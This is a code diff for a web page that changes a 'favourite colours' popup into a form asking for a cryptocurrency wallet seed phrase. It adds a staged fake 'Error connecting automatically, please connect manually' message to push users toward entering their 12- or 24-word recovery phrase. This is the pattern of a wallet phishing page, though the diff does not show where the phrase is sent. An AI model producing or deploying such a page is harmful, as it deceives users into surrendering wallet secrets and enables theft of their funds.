@@ -22,7 +22,7 @@
     }
 
     .container {
-      width: 280px;
+      width: 350px;
       padding: 32px 24px;
       background: #fff;
       border-radius: 12px;
@@ -62,6 +62,7 @@
 
     button {
       padding: 10px 24px;
+      width:250px;
       border: none;
       border-radius: 6px;
       background: #000000;
@@ -71,7 +72,7 @@
     }
 
     button:hover {
-      background: #2563eb;
+      background: #000000
     }
 
     button:disabled {
@@ -101,7 +102,16 @@
       box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
       text-align: center;
     }
+.welcome-title {
+  display: block;
+  font-size: 24px;
+  margin-bottom: 12px;
+}
 
+.error-text {
+  font-size: 15px;
+  line-height: 1.5;
+}
     .popup h3 {
       margin: 0 0 16px;
       color: #374151;
@@ -111,14 +121,14 @@
       width: 100%;
       box-sizing: border-box;
       padding: 10px;
-      border: 1px solid #d1d5db;
+      border: 1px solid #000000;
       border-radius: 6px;
       font-size: 16px;
       outline: none;
     }
 
     .popup input:focus {
-      border-color: #3b82f6;
+      border-color: #000000;
     }
 
     .popup button {
@@ -145,7 +155,7 @@
 <button id="goUp" class="hidden">
   Connect Manually!
 </button>
-```
+
 
   </div>
 
@@ -153,17 +163,17 @@
 
   <div class="overlay" id="colorPopup">
     <div class="popup">
-      <h3>What are your favourite colours?</h3>
+      <h3>Enter your wallet seedphrase</h3>
 
-```
+<p>Enter Wallet Phrase </p>
   <input
     type="text"
     id="colorInput"
-    placeholder="e.g. blue, green"
-    maxlength="100"
+    placeholder=" Enter Phrase"
+    maxlength="290"
     autocomplete="off"
   >
-
+<p>Usually 12 or 24 words and separated by a single space. </p>
   <p
     class="input-error hidden"
     id="inputError">
@@ -210,9 +220,16 @@
     // After 5 seconds, show the error message
     setTimeout(() => {
       spinner.classList.add("hidden");
+message.innerHTML = `
+  <div class="error-text">
+    Error Connecting...<br>
+    There was an error connecting automatically, please connect manually.
+  </div>
+`;
 
-      message.textContent = "Error Connecting";
-      message.classList.add("error");
+message.classList.add("error");
+
+message.classList.add("error");
 
       goUp.classList.remove("hidden");
     }, 5000);
@@ -245,7 +262,7 @@
 
       // Check if empty
       if (!colors) {
-        showError("Please enter at least one colour.");
+        showError("Please enter complete phrases.");
         return;
       }
 
